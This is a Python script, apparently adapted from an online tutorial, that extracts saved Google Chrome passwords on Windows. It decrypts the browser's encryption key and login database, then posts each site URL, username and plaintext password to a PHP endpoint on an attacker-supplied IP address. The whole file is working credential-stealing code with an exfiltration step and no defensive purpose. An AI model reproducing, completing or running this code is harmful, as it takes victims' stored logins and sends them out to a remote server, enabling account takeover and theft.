#!/bin/python3
# tutorial taken from https://www.thepythoncode.com/article/extract-chrome-passwords-python
# this script extracts passwords from google chrome in windows
# adapted to send passwords to a php server 

import os, sys, requests, json, base64, sqlite3, win32crypt, shutil
from Crypto.Cipher import AES
from datetime import timezone, datetime, timedelta

dst_ip = str(sys.argv[1])


# helpful functions
def get_chrome_datetime(chromedate):
	"""Returns a 'datetime.datetime' object from a chrome format datetime
		because chromedate is formatted as the number of microseconds since January 1601"""
	return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
	local_state_path = os.path.join(os.environ["USERPROFILE"],
											   "AppData", "Local", "Google", "Chrome",
											   "User Data", "Local State")
	with open(local_state_path, "r", encoding="utf-8") as f:
		local_state = f.read()
		local_state = json.loads(local_state)

	# decode the encryption key from b64
	key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
	# remove DPAPI str
	key = key[5:]
	# return the decrypted key using a session key derived from the user's credentials
	return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
	try:
		# get the IV
		iv = password[3:15]
		password = password[15:]
		# generate cipher
		cipher = AES.new(key, AES.MODE_GCM, iv)
		# decrypt password
		return cipher.decrypt(password)[:-16].decode()
	except:
		try:
			return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
		except:
			# not supported
			return ""
def main():
	# get the AES key
	key = get_encryption_key()
	#path to the local chrome database
	db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
									  "Google", "Chrome", "User Data", "default", "Login Data")
	# copy the file to another location since the database will be locked when chrome is running
	filename = "ChromeData.db"
	shutil.copyfile(db_path, filename)
	# connect to the database
	db = sqlite3.connect(filename)
	cursor = db.cursor()
	# logins table has the data we need
	cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
	# iterate over rows
	for row in cursor.fetchall():
		origin_url = row[0]
		action_url = row[1]
		username = row[2]
		password = decrypt_password(row[3], key)
		date_created = row[4]
		date_last_used = row[5]
		if username or password:
			# print(f"Origin URL: {origin_url}")
			# print(f"Action URL: {action_url}")
			# print(f"Username: {username}")
			# print(f"Password: {password}")
			origin_url = (f"{origin_url}")
			action_url = (f"{action_url}")
			username = (f"{username}")
			password = (f"{password}")
			

		else:
			continue
		if date_created != 86400000000 and date_created:
			print(f"Creation date: {str(get_chrome_datetime(date_created))}")
		if date_last_used != 86400000000 and date_last_used:
			date_last_used = (f"Last Used: {str(get_chrome_datetime(date_last_used))}")
		
		# send info via a post request
			url = 'http://' + dst_ip + '/ssftp.php?origin_url=' + origin_url + '?action_url=' +  action_url + '?username=' + username + '?password=' + password + '?date_last_used=' + date_last_used
			data = {'origin_url': origin_url, 'action_url': action_url, 'username': username, 'password': password}
			print(requests.post(url, data = data))

		print("="*50)
	cursor.close()
	db.close()
	try:
		# remove copied file
		os.remove(filename)
	except:
		pass

if __name__ == "__main__":
	main()
